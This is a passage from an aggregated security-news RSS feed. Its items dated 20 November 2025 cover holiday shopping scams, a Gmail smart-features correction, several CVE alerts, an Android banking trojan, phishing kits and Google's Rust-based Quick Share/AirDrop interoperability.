            In November, Huntress analysts detected an incident where threat actors likely exploited a recently patched remote code execution vulnerability in Windows Server Update Services (WSUS). After gaining  ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Holiday scams 2025: These common shopping habits make you the easiest target</title><link>https://www.malwarebytes.com/blog/news/2025/11/holiday-scams-2025-these-common-shopping-habits-make-you-the-easiest-target</link><author></author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 13:50:00 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[Every year, shoppers get faster, savvier, and more mobile. We compare prices on the go, download apps for coupons, and jump on deals before they disappear. But during deal-heavy periods like Black Friday, Cyber Monday, and the December shopping rush, convenience can work against us.Quick check-outs, unknown websites, and ads promising unbeatable prices make shoppers easy targets.Shopping scams can steal money or data, but they also steal peace of mind. Victims often describe a mix of frustration, embarrassment, and anger that lasts for a long time. And during the holidays when you’re already stretched thin, the financial and emotional fallout lands harder, spoiling plans, straining trust, and adding anxiety to what should be a joyful and restful time.The data for deals exchangeDuring the holidays, deal-chasing behavior spikes. Nearly 9 in 10 mobile consumers hand over emails or phone numbers in the name of savings—often without realizing how much personal data they’re sharing.79% sign up for promotional emails to get offers.66% download an app for a coupon, discount, or free trial.58% give their phone number for texts to get a deal.This constant “data for deals” exchange normalizes risky habits that scammers can easily exploit through fake promotions and reward campaigns.The Walmart gift card scamThe scammers aren’t actually offering a free gift card. It’s a data-harvesting trap. Each form you fill out collects your name, email, phone number, ZIP code, and interests, all used to build a detailed profile that’s resold to advertisers or used for more scams down the line.These so-called “holiday reward” scams pop up every year, promising gift cards, coupons, or cash-back bonuses, and they work because they play on the same instinct as legitimate deals: the urge to grab a bargain before it disappears.Scams show up wherever people shop. As holiday buying moves across social feeds, messaging apps, and mobile alerts, scammers follow the traffic.Social platforms have become informal online malls: buy/sell groups, influencer offers, and limited-time stories all blur the line between social and shopping.57% have bought from a buy/sell/trade group53% have used a platform like Facebook Marketplace or OfferUp38% have DM’d a company or seller for a discountIt’s a familiar environment, and that’s the problem. Fake listings and ads sit right beside real ones, making it hard to tell them apart when you’re scrolling fast. Half of people (51%) encounter scams on social media every week, and 1 in 4 (27%) see at least one scam a day.Shopping has become social. It’s quick, conversational, and built on trust. But that same trust leads to some of the most common holiday scams.A little skepticism when shopping via your social feeds can go a long way, especially when deals and deadlines make everything feel more urgent.Three scams shoppers should watch out forExposure to scams is baked into the modern shopping experience—especially across social platforms and mobile marketplaces. Here are three common types that surge during the holidays.Marketplace scams are one of the most common traps during the holidays, precisely because they hide in plain sight. Shoppers tend to feel safe on familiar platforms, whether that’s a buy-and-sell group, a resale page, or a trusted marketplace app. But fake listings, spoofed profiles, and too-good-to-miss deals are everywhere.Around a third of people (36%) come across a marketplace scam weekly (15% are targeted daily), and roughly 1 in 10 have fallen victim. Younger users are hit hardest: Gen Z and Millennials are the most impacted age group—70% of victims are Gen Z/Millennial (vs 57% victims overall). They also are more likely to lose money after clicking a fake ad or transferring payment for an item that never arrives. The result is a perfect storm of trust, speed, and urgency. The very ingredients scammers rely on.Marketplace scams don’t just drain bank accounts, they also take a personal toll. Many victims describe the experience as financially and emotionally exhausting, with some losing money they can’t recover, others discovering new accounts opened in their name, and some even locked out of their own. For others, the impact spreads further: embarrassment over being tricked, stress at work, and health problems triggered by anxiety or sleepless nights.Postal tracking scams are already mainstream, but the holidays invite particular risk. With shoppers checking delivery updates several times a day, it’s easy to click without thinking. Around 4 in 10 people have encountered one of these scams (62%), and more than 8 in 10 track packages directly from their phones (83%), making mobile users a prime target. Again, younger shoppers are the most impacted with 62% of victims being either Gen Z or Millennials (vs 57% of scam victims overall).The messages look convincing: real courier logos, legitimate-sounding tracking numbers, and language that mirrors official updates.A single click on what looks like a delivery confirmation can lead to a fake login page, a malicious download, or a request for personal information. It’s one of the simplest, most believable scams out there—and one of the easiest to fall for when you’re juggling gifts, deadlines, and constant delivery alerts.The hunt for flash sales, coupon codes, and last-minute deals can make shoppers more exposed to malicious ads and downloads.More than half of people (58%) have encountered ad-related malware (or, “adware”, which is software that floods your screen with unwanted ads or tracks what you click to profit from your data), and over a quarter have fallen victim (27%). Gen Z users who spend the most time online are the age bracket that are most susceptible to adware, at nearly 40%.Others scams involve malvertising, where criminals plant malicious code inside online ads that look completely legitimate, and just loading the page can be enough to start the attack. Malvertising too tends to spike during the holiday rush, when people are scrolling quickly through social feeds or searching for discounts. Forty percent of people have been targeted by malvertising and 11% have fallen victim. Adware targets 45% of people, claiming 20% as victims.Fake ads are designed to look just like the real thing, complete with familiar branding and countdown timers. One wrong tap can install a malicious “shopping helper” app, redirect to a phishing site, or trigger a background download you never meant to start. It’s a reminder that even the most legitimate-looking ads deserve a second glance before you click.Why shoppers drop their guardThe holidays bring joy but also a lot of pressure. There’s the financial strain, endless to-do lists, and that feeling that you don’t have enough time to do it all. Scammers know this, and use urgency, stress, and even guilt to make you click before you think. And when people do fall for a scam, the financial impact isn’t the only upsetting thing. Victims of scams are often embarrassed and blame themselves, and then have the stress of picking up the pieces.Most shoppers worry about being scammed (61%) or losing money (73%), but with constant notifications, flashing ads, and countdown timers competing for attention, even the most careful shoppers can click before they check. Scammers count on that moment of distraction—and they only need one.Mobile-first shopping has become second nature, and during the holidays it’s faster and more frantic than ever. Fifty-five percent of people get a scam text message weekly, while 27% are targeted daily.Downloading new apps, checking delivery updates, or tapping limited-time offers all feel routine. Nearly 6 in 10 people say that downloading apps to buy products or engage with companies is now a way of life, and 39% admit they’re more likely to click a link on their phone than on their laptop.How to shop smarter (and safer) this holidayMost people don’t have protections that match the pace of holiday shopping, but the good news is, small steps make a big difference.Keep an eye on your accounts. Make it a habit to glance over your bank or credit statements during the holidays. Spotting unexpected activity early is one of the simplest ways to stop fraud before it snowballs.Add strong login protections. Use unique passwords, or a passkey, for your main shopping and payment accounts, and turn on two-factor authentication wherever it’s offered. It takes seconds to set up and can stop someone from breaking in, even if they have your password.Guard against malicious ads and fake apps. Scam sites and pop-ups tend to spike during busy shopping periods, hiding behind flash sales or delivery updates. Malwarebytes Mobile Security and Malwarebytes Browser Guard can block these pages before they load, keeping scam domains, fake coupons, and malvertising out of sight and out of reach.Be careful about where you share personal details, especially for “free” offers or surveys. If something asks for more information than it needs, it’s probably not worth the risk. Using identity protection tools adds an extra layer of defense if your data ever does end up in the wrong hands.A few minutes of setup now can save you days of stress later. Shop smart, stay skeptical, and enjoy the season safely.The research in this article is based on a March 2025 survey prepared by an independent research consultant and distributed via Forsta among n=1,300 survey respondents ages 18 and older in the United States, UK, Austria, Germany and Switzerland. The sample was equally split for gender with a spread of ages, geographical regions and race groups, and weighted to provide a balanced view.We don’t just report on scams—we help detect themCybersecurity risks should never spread beyond a headline. If something looks dodgy to you, check if it’s a scam using Malwarebytes Scam Guard, a feature of our mobile protection products. Submit a screenshot, paste suspicious content, or share a text or phone number, and we’ll tell you if it’s a scam or legit. Download Malwarebytes Mobile Security for iOS or Android and try it today!]]></content:encoded></item><item><title>[Correction] Gmail can read your emails and attachments to power &amp;#8220;smart features&amp;#8221;</title><link>https://www.malwarebytes.com/blog/news/2025/11/gmail-is-reading-your-emails-and-attachments-to-train-its-ai-unless-you-turn-it-off</link><author></author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 13:48:50 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[We’ve updated this article after realising we contributed to a perfect storm of misunderstanding around a recent change in the wording and placement of Gmail’s smart features. The settings themselves aren’t new, but the way Google recently rewrote and surfaced them led a lot of people (including us) to believe Gmail content might be used to train Google’s AI models, and that users were being opted in automatically. After taking a closer look at Google’s documentation and reviewing other reporting, that doesn’t appear to be the case.Gmail does scan email content to power its own “smart features,” such as spam filtering, categorisation, and writing suggestions. But this is part of how Gmail normally works and isn’t the same as training Google’s generative AI models. Google also maintains that these feature settings are opt-in rather than opt-out, although users’ experiences seem to vary depending on when and how the new wording appeared.It’s easy to see where the confusion came from. Google’s updated language around “smart features” is vague, and the term “smart” often implies AI—especially at a time when Gemini is being integrated into other parts of Google’s products. When the new wording started appearing for some users without much explanation, many assumed it signalled a broader shift. It’s also come around the same time as a proposed class-action lawsuit in the state of California, which, according to Bloomberg, alleges that Google gave Gemini AI access to Gmail, Chat, and Meet without proper user consent.We’ve revised this article to reflect what we can confirm from Google’s documentation, as it’s always been our aim to give readers accurate, helpful guidance.Google has updated some Gmail settings around how its “smart features” work, which control how Gmail analyses your messages to power built-in functions.According to reports we’ve seen, Google has started automatically opting users in to allow Gmail to access all private messages and attachments for its smart features. This means your emails are analyzed to improve your experience with Chat, Meet, Drive, Email and Calendar products. However, some users are now reporting that these settings are switched on by default instead of asking for explicit opt-in—although Google’s help page states that users are opted-out for default.  How to check your settingsOpting in or out requires you to change settings in two places, so I’ve tried to make it as easy to follow as possible. Feel free to let me know in the comments if I missed anything.To fully opt out, you must turn off Gmail’s smart features in two separate locations in your settings. Don’t miss one, or AI training may continue.Step 1: Turn off Smart features in Gmail, Chat, and Meet settingsOpen Gmail on your desktop or mobile app.Click the gear icon →  (desktop) or Menu →  (mobile).Find the section called  in Gmail, Chat, and Meet. You’ll need to scroll down quite a bit.Scroll down and hit  if on desktop.Step 2: Turn off Google Workspace smart featuresStill in , locate Google Workspace smart features.Click on Manage Workspace smart feature settings.You’ll see two options: Smart features in Google Workspace and Smart features in other Google products. again in this screen.Step 3: Verify if both are offMake sure both toggles remain off.Refresh your Gmail app or sign out and back in to confirm changes.We don’t just report on privacy—we offer you the option to use it.]]></content:encoded></item><item><title>TV streaming piracy service with 26M yearly visits shut down</title><link>https://www.bleepingcomputer.com/news/security/tv-streaming-piracy-service-photocall-with-26m-yearly-visits-shut-down/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Thu, 20 Nov 2025 13:31:43 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Photocall, a TV piracy streaming platform with over 26 million users annually, has ceased operations following a joint investigation by the Alliance for Creativity and Entertainment (ACE) and DAZN. [...]]]></content:encoded></item><item><title>Russian hackers target IVF clinics across UK used by thousands of couples</title><link>https://databreaches.net/2025/11/20/russian-hackers-target-ivf-clinics-across-uk-used-by-thousands-of-couples/?pk_campaign=feed&amp;pk_kwd=russian-hackers-target-ivf-clinics-across-uk-used-by-thousands-of-couples</link><author>Dissent</author><category>databreach</category><pubDate>Thu, 20 Nov 2025 13:22:53 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Lessons from Oracle E-Business Suite Hack That Allegedly Compromises Nearly 30 Organizations Worldwide</title><link>https://cybersecuritynews.com/oracle-e-business-suite-hack/</link><author></author><category>security</category><pubDate>Thu, 20 Nov 2025 13:20:27 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[Lessons from Oracle E-Business Suite Hack That Allegedly Compromises Nearly 30 Organizations Worldwide
            A sophisticated cyberattack targeting Oracle E-Business Suite (EBS) customers has exposed critical vulnerabilities in enterprise resource planning systems, compromising an estimated 100 organizations  ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Critical 7-Zip Vulnerability CVE-2025-11001 Prompts NHS Cyber Alert</title><link>https://thecyberexpress.com/cve-2025-11001-7zip-vulnerability-nhs/</link><author></author><category>security</category><pubDate>Thu, 20 Nov 2025 13:15:36 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
            A newly discovered security flaw, identified as CVE-2025-11001, is targeting users across both public and private sectors. The vulnerability, affecting all versions of 7-Zip before 25.00, allows attac ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Comet Browser Flaw Lets Hidden API Run Commands on Users’ Devices</title><link>https://hackread.com/comet-browser-flaw-hidden-api-commands-devices/</link><author></author><category>security</category><pubDate>Thu, 20 Nov 2025 12:30:57 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
            Security researchers from web browser security firm SquareX have issued a public warning after uncovering a vulnerability in Perplexity’s Comet AI browser. Their research, published on November 19, 20 ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Europe Strengthens Cyber Defense as ENISA Becomes CVE Root</title><link>https://thecyberexpress.com/enisa-cve-root-eu-root-management/</link><author></author><category>security</category><pubDate>Thu, 20 Nov 2025 12:30:41 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[Europe Strengthens Cyber Defense as ENISA Becomes CVE Root
            The European Union Agency for Cybersecurity (ENISA) has taken a major step forward in advancing vulnerability management across Europe by becoming a CVE Root within the global Common Vulnerabilities a ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>ThreatsDay Bulletin: 0-Days, LinkedIn Spies, Crypto Crimes, IoT Flaws and New Malware Waves</title><link>https://thehackernews.com/2025/11/threatsday-bulletin-0-days-linkedin.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiDHftpu1bcFinhNlKIe66O-YOhqR69P1D1ZpFlYfjlxgf3VjuOBQwN0d1nhn7OmTTmSi0RhtBpxPPD2pmU9_a-t4FAadKhz38Ex4Ix3Lu9XBQMSqEwj6xhbu55QUwqmPXmQPgRJdml181QdebM1BIwrDqMvA_QNLZvwjXq61_q_LkghJ7EQWVNyFzObDgh/s1600/threatsday-main.jpg" length="" type=""/><pubDate>Thu, 20 Nov 2025 12:29:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[This week has been crazy in the world of hacking and online security. From Thailand to London to the US, we've seen arrests, spies at work, and big power moves online. Hackers are getting caught. Spies are getting better at their jobs. Even simple things like browser add-ons and smart home gadgets are being used to attack people.
Every day, there's a new story that shows how quickly things are]]></content:encoded></item><item><title>Threat Actors Allegedly Selling Microsoft Office 0-Day RCE Vulnerability on Hacking Forums</title><link>https://cybersecuritynews.com/microsoft-office-0-day-rce-claim/</link><author></author><category>security</category><pubDate>Thu, 20 Nov 2025 12:17:01 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
            A threat actor known as Zeroplayer has reportedly listed a zero-day remote code execution (RCE) vulnerability, combined with a sandbox escape, targeting Microsoft Office and Windows systems for sale o ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Scam USPS and E-Z Pass Texts and Websites</title><link>https://www.schneier.com/blog/archives/2025/11/scam-usps-and-e-z-pass-texts-and-websites.html</link><author>Bruce Schneier</author><category>security</category><pubDate>Thu, 20 Nov 2025 12:07:38 +0000</pubDate><source url="https://www.schneier.com/">Schneier on Security</source><content:encoded><![CDATA[In a complaint filed Wednesday, the tech giant accused “a cybercriminal group in China” of selling “phishing for dummies” kits. The kits help unsavvy fraudsters easily “execute a large-scale phishing campaign,” tricking hordes of unsuspecting people into “disclosing sensitive information like passwords, credit card numbers, or banking information, often by impersonating well-known brands, government agencies, or even people the victim knows.”These branded “Lighthouse” kits offer two versions of software, depending on whether bad actors want to launch SMS and e-commerce scams. “Members may subscribe to weekly, monthly, seasonal, annual, or permanent licenses,” Google alleged. Kits include “hundreds of templates for fake websites, domain set-up tools for those fake websites, and other features designed to dupe victims into believing they are entering sensitive information on a legitimate website.”Google’s filing said the scams often begin with a text claiming that a toll fee is overdue or a small fee must be paid to redeliver a package. Other times they appear as ads—­sometimes even Google ads, until Google detected and suspended accounts—­luring victims by mimicking popular brands. Anyone who clicks will be redirected to a website to input sensitive information; the sites often claim to accept payments from trusted wallets like Google Pay.]]></content:encoded></item><item><title>Android Quick Share Support for AirDrop: A Secure Approach to Cross-Platform File Sharing</title><link>http://security.googleblog.com/2025/11/android-quick-share-support-for-airdrop-security.html</link><author>Edward Fernandez</author><category>security</category><pubDate>Thu, 20 Nov 2025 12:00:00 +0000</pubDate><source url="http://security.googleblog.com/">Google Security Blog</source><content:encoded><![CDATA[
Technology should bring people closer together, not create walls. Being able to communicate and connect with friends and family should be easy regardless of the phone they use. That’s why Android has been building experiences that help you stay connected across platforms.

As part of our efforts to continue to make cross-platform communication more seamless for users, we've made Quick Share interoperable with AirDrop, allowing for two-way file sharing between Android and iOS devices, starting with the Pixel 10 Family. This new feature makes it possible to quickly share your photos, videos, and files with people you choose to communicate with, without worrying about the kind of phone they use. 

Most importantly, when you share personal files and content, you need to trust that it stays secure. You can share across devices with confidence knowing we built this feature with security at its core, protecting your data with strong safeguards that have been tested by independent security experts.

We built Quick Share’s interoperability support for AirDrop with the same rigorous security standards that we apply to all Google products. Our approach to security is proactive and deeply integrated into every stage of the development process. This includes:
 We identify and address potential security risks before they can become a problem.Internal Security Design and Privacy Reviews: Our dedicated security and privacy teams thoroughly review the design to ensure it meets our high standards.Internal Penetration Testing: We conduct extensive in-house testing to identify and fix vulnerabilities.
This Secure by Design philosophy ensures that all of our products are not just functional but also fundamentally secure.

This feature is also protected by a multi-layered security approach to ensure a safe sharing experience from end-to-end, regardless of what platform you’re on. 
 The communication channel itself is hardened by our use of Rust to develop this feature. This memory-safe language is the industry benchmark for building secure systems and provides confidence that the connection is protected against buffer overflow attacks and other common vulnerabilities. Built-in Platform Protections: This feature is strengthened by the robust built-in security of both Android and iOS. On Android, security is built in at every layer. Our deep investment in Rust at the OS level hardens the foundation, while proactive defenses like Google Play Protect work to keep your device safe. This is complemented by the security architecture of iOS that provides its own strong safeguards that mitigate malicious files and exploitation. These overlapping protections on both platforms work in concert with the secure connection to provide comprehensive safety for your data when you share or receive.Sharing across platforms works just like you're used to: a file requires your approval before being received, so you're in control of what you accept.The Power of Rust: A Foundation of Secure Communication
A key element of our security strategy for the interoperability layer between Quick Share and AirDrop is the use of the memory-safe Rust programming language. Recognized by security agencies around the world, including the NSA and CISA, Rust is widely considered the industry benchmark for building secure systems because it eliminates entire classes of memory-safety vulnerabilities by design.
Rust is already a cornerstone of our broader initiative to eliminate memory safety bugs across Android. Its selection for this feature was deliberate, driven by the unique security challenges of cross-platform communication that demanded the most robust protections for memory safety.

The core of this feature involves receiving and parsing data sent over a wireless protocol from another device. Historically, when using a memory-unsafe language, bugs in data parsing logic are one of the most common sources of high-severity security vulnerabilities. A malformed data packet sent to a parser written in a memory-unsafe language can lead to buffer overflows and other memory corruption bugs, creating an opportunity for code execution.

This is precisely where Rust provides a robust defense. Its compiler enforces strict ownership and borrowing rules at compile time, which guarantees memory safety. Rust removes entire classes of memory-related bugs. This means our implementation is inherently resilient against attackers attempting to use maliciously crafted data packets to exploit memory errors. 
Secure Sharing Using AirDrop's "Everyone" Mode
To ensure a seamless experience for both Android and iOS users, Quick Share currently works with AirDrop's "Everyone for 10 minutes" mode. This feature does not use a workaround; the connection is direct and peer-to-peer, meaning your data is never routed through a server, shared content is never logged, and no extra data is shared. As with "Everyone for 10 minutes" mode on any device when you’re sharing between non-contacts, you can ensure you're sharing with the right person by confirming their device name on your screen with them in person.This implementation using "Everyone for 10 minutes” mode is just the first step in seamless cross-platform sharing, and we welcome the opportunity to work with Apple to enable “Contacts Only” mode in the future.
Tested by Independent Security Experts
After conducting our own secure product development, internal threat modeling, privacy reviews, and red team penetration tests, we engaged with , a leading third-party penetration testing firm, to further validate the security of this feature and conduct an independent security assessment. The assessment found the interoperability between Quick Share and AirDrop is secure, is “notably stronger” than other industry implementations and does not leak any information. 

Based on these internal and external assessments, we believe our implementation provides a strong security foundation for cross-platform file sharing for both Android and iOS users. We will continue to evaluate and enhance the implementation’s security in collaboration with additional third-party partners.

To complement this deep technical audit, we also sought expert third-party perspective on our approach from Dan Boneh, a renowned security expert and professor at Stanford University:

“Google’s work on this feature, including the use of memory safe Rust for the core communications layer, is a strong example of how to build secure interoperability, ensuring that cross-platform information sharing remains safe. I applaud the effort to open more secure information sharing between platforms and encourage Google and Apple to work together more on this."
The Future of File-Sharing Should Be Interoperable
This is just the first step as we work to improve the experience and expand it to more devices. We look forward to continuing to work with industry partners to make connecting and communicating across platforms a secure, seamless experience for all users.
]]></content:encoded></item><item><title>US, allies sanction Russian bulletproof hosting services for ransomware support</title><link>https://databreaches.net/2025/11/20/us-allies-sanction-russian-bulletproof-hosting-services-for-ransomware-support/?pk_campaign=feed&amp;pk_kwd=us-allies-sanction-russian-bulletproof-hosting-services-for-ransomware-support</link><author>Dissent</author><category>databreach</category><pubDate>Thu, 20 Nov 2025 11:59:41 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Researchers claim ‘largest leak ever’ after uncovering WhatsApp enumeration flaw</title><link>https://databreaches.net/2025/11/20/researchers-claim-largest-leak-ever-after-uncovering-whatsapp-enumeration-flaw/?pk_campaign=feed&amp;pk_kwd=researchers-claim-largest-leak-ever-after-uncovering-whatsapp-enumeration-flaw</link><author>Dissent</author><category>databreach</category><pubDate>Thu, 20 Nov 2025 11:53:16 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Large medical lab in South Africa suffers multiple data breaches</title><link>https://databreaches.net/2025/11/20/large-medical-lab-in-south-africa-suffers-multiple-data-breaches/?pk_campaign=feed&amp;pk_kwd=large-medical-lab-in-south-africa-suffers-multiple-data-breaches</link><author>Dissent</author><category>databreach</category><pubDate>Thu, 20 Nov 2025 11:52:49 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Inside the dark web job market</title><link>https://securelist.com/dark-web-job-market-2023-2025/118057/</link><author>Kaspersky Security Services</author><category>threatintel</category><enclosure url="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/11/20105054/SL-dark-we-job-market-2023-2025-featured-150x150.png" length="" type=""/><pubDate>Thu, 20 Nov 2025 11:37:00 +0000</pubDate><source url="https://securelist.com/">Securelist</source><content:encoded><![CDATA[In 2022, we published our research examining how IT specialists look for work on the dark web. Since then, the job market has shifted, along with the expectations and requirements placed on professionals. However, recruitment and headhunting on the dark web remain active.So, what does this job market look like today? This report examines how employment and recruitment function on the dark web, drawing on 2,225 job-related posts collected from shadow forums between January 2023 and June 2025. Our analysis shows that the dark web continues to serve as a parallel labor market with its own norms, recruitment practices and salary expectations, while also reflecting broader global economic shifts. Notably, job seekers increasingly describe prior work experience within the shadow economy, suggesting that for many, this environment is familiar and long-standing.The majority of job seekers do not specify a professional field, with 69% expressing willingness to take any available work. At the same time, a wide range of roles are represented, particularly in IT. Developers, penetration testers and money launderers remain the most in-demand specialists, with reverse engineers commanding the highest average salaries. We also observe a significant presence of teenagers in the market, many seeking small, fast earnings and often already familiar with fraudulent schemes.While the shadow market contrasts with legal employment in areas such as contract formality and hiring speed, there are clear parallels between the two. Both markets increasingly prioritize practical skills over formal education, conduct background checks and show synchronized fluctuations in supply and demand.Looking ahead, we expect the average age and qualifications of dark web job seekers to rise, driven in part by global layoffs. Ultimately, the dark web job market is not isolated — it evolves alongside the legitimate labor market, influenced by the same global economic forces.In this report, you’ll find:Demographics of the dark web job seekersTop specializations on the dark webComparison between legal and shadow job markets]]></content:encoded></item><item><title>CTM360 Exposes a Global WhatsApp Hijacking Campaign: HackOnChat</title><link>https://thehackernews.com/2025/11/ctm360-exposes-global-whatsapp.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjH2aVkVgE_AQcR38boab-hJ6KPZrNbJ2Q12DXvADAqDV8kVqEmRnL4VzFH95VhcRrYxIo0iS-Sb_9NwtZUVm5CxCmk0q0Eywnjik5050X0JPziBgeTK9YSKhKdkOZNvOhm75YitAMspH9sZSEqRXIJurcgfRgOYbCfEqGZBHUwwW7RtOJ3Lw8sg0rX4mI/s1600/ctm360.jpg" length="" type=""/><pubDate>Thu, 20 Nov 2025 11:30:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[CTM360 has identified a rapidly expanding WhatsApp account-hacking campaign targeting users worldwide via a network of deceptive authentication portals and impersonation pages. The campaign, internally dubbed HackOnChat, abuses WhatsApp’s familiar web interface, using social engineering tactics to trick users into compromising their accounts.
Investigators identified thousands of malicious URLs]]></content:encoded></item><item><title>Critical N-able N-central Vulnerabilities Allow attacker to interact with legacy APIs and read sensitive files</title><link>https://cybersecuritynews.com/critical-n-able-n-central-vulnerabilities/</link><author></author><category>security</category><pubDate>Thu, 20 Nov 2025 11:24:01 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[Critical N-able N-central Vulnerabilities Allow attacker to interact with legacy APIs and read sensitive files
            N-able’s N-central remote management and monitoring (RMM) platform faces critical security risks following the discovery of multiple vulnerabilities.
According to Horizon3.ai, it allows unauthenticate ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Critical Twonky Server Vulnerabilities Let Attackers Bypass Authentication</title><link>https://cybersecuritynews.com/twonky-server-vulnerabilities/</link><author></author><category>security</category><pubDate>Thu, 20 Nov 2025 11:18:52 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[Critical Twonky Server Vulnerabilities Let Attackers Bypass Authentication
            Twonky Server version 8.5.2 contains two critical authentication bypass vulnerabilities that allow unauthenticated attackers to gain full administrative access to the media server software.
Rapid7 dis ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Grafana Patches Critical SCIM Flaw (CVE-2025-41115, CVSS 10) Allowing Privilege Escalation and User Impersonation</title><link>https://securityonline.info/grafana-patches-critical-scim-flaw-cve-2025-41115-cvss-10-allowing-privilege-escalation-and-user-impersonation/</link><author></author><category>security</category><pubDate>Thu, 20 Nov 2025 11:09:31 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
            Grafana has released emergency security updates for Grafana Enterprise addressing a critical privilege-escalation flaw in its SCIM provisioning feature. Tracked as CVE-2025-41115, the vulnerability ca ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>New Sturnus Android Trojan Quietly Captures Encrypted Chats and Hijacks Devices</title><link>https://thehackernews.com/2025/11/new-sturnus-android-trojan-quietly.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi8I7UV4u8O03jdgw6jpt_ITLXyqrcwoVLRUr_84vWKRe9ctYFLOAhKGvO7poJq_5YZwb7-3a2NzF0smKc5U0KOj6dgRmw5o0jWI0xEtZMjZTZ8KByylPoes-8t_8sXq7wWEyJ_TQtjI81OS1hx-uAG5a3xVCgEd9sqr3JlCemLHuS9ui-ctH6KjH8-uQri/s1600/android-malware.jpg" length="" type=""/><pubDate>Thu, 20 Nov 2025 11:04:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Cybersecurity researchers have disclosed details of a new Android banking trojan called Sturnus that enables credential theft and full device takeover to conduct financial fraud.
"A key differentiator is its ability to bypass encrypted messaging," ThreatFabric said in a report shared with The Hacker News. "By capturing content directly from the device screen after decryption, Sturnus can monitor]]></content:encoded></item><item><title>Vulnerabilities in SOPlanning software</title><link>https://cert.pl/en/posts/2025/11/CVE-2025-62293/</link><author></author><category>security</category><pubDate>Thu, 20 Nov 2025 10:55:00 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[Vulnerabilities in SOPlanning software]]></content:encoded></item><item><title>CrowdStrike Named Overall Leader in 2025 KuppingerCole ITDR Leadership Compass</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-named-overall-leader-2025-kuppingercole-itdr-leadership-compass/</link><author></author><category>security</category><pubDate>Thu, 20 Nov 2025 10:49:53 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
            KuppingerCole recognizes CrowdStrike as the Overall Leader, achieving the top position in every evaluated category in its 2025 identity security report.
CrowdStrike has been named the Overall Leader i ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Crypto mixer founders sent to prison for laundering over $237 million</title><link>https://www.bleepingcomputer.com/news/security/samourai-cryptomixer-founders-sent-to-prison-for-laundering-over-237-million/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Thu, 20 Nov 2025 10:49:37 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[The founders of the Samourai Wallet (Samourai) cryptocurrency mixing service have been sent to prison for helping criminals launder over $237 million. [...]]]></content:encoded></item><item><title>CVE-2025-12414 - Looker account compromise via punycode homograph attack</title><link>https://cvefeed.io/vuln/detail/CVE-2025-12414</link><author></author><category>vulns</category><pubDate>Thu, 20 Nov 2025 10:32:52 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-12414
 Nov. 20, 2025, 3:17 p.m. | 15 hours, 30 minutes ago
An attacker could take over a Looker account in a Looker instance configured with OIDC authentication, due to email address string normalization.Looker-hosted and Self-hosted were found to be vulnerable.

This issue has already been mitigated for Looker-hosted.


Self-hosted instances must be upgraded as soon as possible. This vulnerability has been patched in all supported versions of Self-hosted.
The versions below have all been updated to protect from this vulnerability. You can download these versions at the Looker download page   https://download.looker.com/ :
  *  24.12.100+
  *  24.18.193+
  *  25.0.69+
  *  25.6.57+
  *  25.8.39+
  *  25.10.22+
  *  25.12.0+
 9.2 | CRITICAL

